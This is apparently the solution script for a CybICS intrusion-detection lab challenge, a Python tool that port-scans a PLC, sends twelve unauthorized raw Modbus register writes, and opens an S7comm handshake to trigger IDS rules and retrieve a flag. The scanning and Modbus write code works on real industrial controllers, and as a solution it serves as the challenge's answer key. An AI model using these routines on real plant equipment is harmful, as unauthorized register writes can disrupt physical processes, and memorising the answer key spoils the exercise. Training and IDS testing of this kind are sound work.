#!/usr/bin/env python3
"""
CybICS IDS Challenge - Solution Script
Triggers at least 3 different IDS detection rules and retrieves the flag.

Usage:
    python3 solve_ids_challenge.py [openplc_ip] [ids_url]

Default:
    openplc_ip = 172.18.0.3
    ids_url     = http://localhost:8443
"""

import sys
import time
import socket
import struct
import argparse
import requests

parser = argparse.ArgumentParser(description="Solve the IDS Detection Challenge")
parser.add_argument("openplc_ip", nargs="?", default="172.18.0.3",
                    help="OpenPLC IP address (default: 172.18.0.3)")
parser.add_argument("--ids-url", default="http://localhost:8443",
                    help="IDS base URL (default: http://localhost:8443)")
args = parser.parse_args()

PLC_IP = args.openplc_ip
IDS_URL = args.ids_url


def check_ids_status():
    """Verify the IDS is running"""
    try:
        r = requests.get(f"{IDS_URL}/api/status", timeout=5)
        data = r.json()
        if data.get("active"):
            print(f"[+] IDS is active - {data['stats']['packets_analyzed']} packets analyzed")
            return True
        else:
            print("[-] IDS is not active. Starting it...")
            requests.post(f"{IDS_URL}/api/start",
                          json={}, headers={"Content-Type": "application/json"}, timeout=5)
            time.sleep(2)
            return True
    except Exception as e:
        print(f"[-] Cannot reach IDS at {IDS_URL}: {e}")
        return False


def build_modbus_write(register, value):
    """Build a raw Modbus TCP write single register (FC 0x06) packet"""
    # Transaction ID (2) + Protocol ID (2) + Length (2) + Unit ID (1) + FC (1) + Register (2) + Value (2)
    transaction_id = 1
    protocol_id = 0
    length = 6  # Unit ID + FC + Register + Value
    unit_id = 1
    func_code = 0x06
    return struct.pack(">HHHBBHH", transaction_id, protocol_id, length,
                       unit_id, func_code, register, value)


def trigger_port_scan():
    """
    Attack 1: Port Scan - connect to multiple ports to trigger port_scan rule.
    Threshold: 5 unique ports in 10 seconds.
    """
    print("\n[*] Attack 1: Port Scan (port_scan rule)")
    print(f"    Scanning 8 ports on {PLC_IP}...")
    ports = [22, 80, 102, 443, 502, 1881, 8080, 8443]
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((PLC_IP, port))
            s.close()
            print(f"    Port {port}: open")
        except (socket.timeout, ConnectionRefusedError, OSError):
            print(f"    Port {port}: closed/filtered")
    print("    [+] Port scan complete - should trigger port_scan rule")


def trigger_modbus_writes():
    """
    Attack 2: Unauthorized Modbus Writes - send writes to trigger modbus_unauth_write rule.
    Threshold: 10 writes in 30 seconds from non-service host.
    """
    print("\n[*] Attack 2: Unauthorized Modbus Writes (modbus_unauth_write rule)")
    print(f"    Sending 12 Modbus writes to {PLC_IP}:502...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((PLC_IP, 502))
        for i in range(12):
            pkt = build_modbus_write(1124, 100 + i)
            s.send(pkt)
            resp = s.recv(256)
            print(f"    Write {i+1}/12: register 1124 = {100+i} (resp: {len(resp)} bytes)")
            time.sleep(0.1)
        s.close()
        print("    [+] Modbus writes complete - should trigger modbus_unauth_write rule")
    except Exception as e:
        print(f"    [-] Modbus write failed: {e}")


def trigger_s7_access():
    """
    Attack 3: S7comm Enumeration - connect to S7 port to trigger s7_enumeration rule.
    Threshold: any connection to port 102 or 1102.
    """
    print("\n[*] Attack 3: S7comm Enumeration (s7_enumeration rule)")
    # Try S7comm port on OpenPLC
    for port in [102, 1102]:
        target = PLC_IP if port == 102 else "172.18.0.6"
        print(f"    Connecting to {target}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            # Send a COTP connection request (minimal S7 handshake)
            cotp_cr = bytes([
                0x03, 0x00, 0x00, 0x16,  # TPKT header
                0x11, 0xE0, 0x00, 0x00,  # COTP CR
                0x00, 0x01, 0x00, 0xC0,  # Source ref, class
                0x01, 0x0A, 0xC1, 0x02,  # Params
                0x01, 0x00, 0xC2, 0x02,  # Params
                0x01, 0x02,              # Params
            ])
            s.send(cotp_cr)
            try:
                resp = s.recv(256)
                print(f"    Got response: {len(resp)} bytes")
            except socket.timeout:
                print(f"    No response (timeout)")
            s.close()
            print(f"    [+] S7comm access on port {port} complete")
            break
        except (ConnectionRefusedError, OSError) as e:
            print(f"    Port {port} failed: {e}")


def get_flag():
    """Check the flag endpoint"""
    print("\n[*] Checking flag endpoint...")
    try:
        r = requests.get(f"{IDS_URL}/api/flag", timeout=5)
        data = r.json()
        if data.get("flag"):
            print(f"\n{'='*60}")
            print(f"  FLAG: {data['flag']}")
            print(f"  {data['message']}")
            print(f"{'='*60}\n")
            return data["flag"]
        else:
            print(f"    {data['message']}")
            return None
    except Exception as e:
        print(f"    [-] Error: {e}")
        return None


def main():
    print("=" * 60)
    print("  CybICS IDS Challenge - Solution")
    print("  Triggering 3 detection rules to unlock the flag")
    print("=" * 60)

    if not check_ids_status():
        sys.exit(1)

    # Trigger three different detection rules
    trigger_port_scan()
    time.sleep(1)

    trigger_modbus_writes()
    time.sleep(1)

    trigger_s7_access()
    time.sleep(2)

    # Check alerts
    try:
        r = requests.get(f"{IDS_URL}/api/status", timeout=5)
        data = r.json()
        print(f"\n[*] IDS Stats: {data['stats']['alerts_total']} total alerts")
    except Exception:
        pass

    # Get flag
    flag = get_flag()
    if not flag:
        print("\n[!] Flag not yet available. Waiting 5 seconds and retrying...")
        time.sleep(5)
        get_flag()


if __name__ == "__main__":
    main()
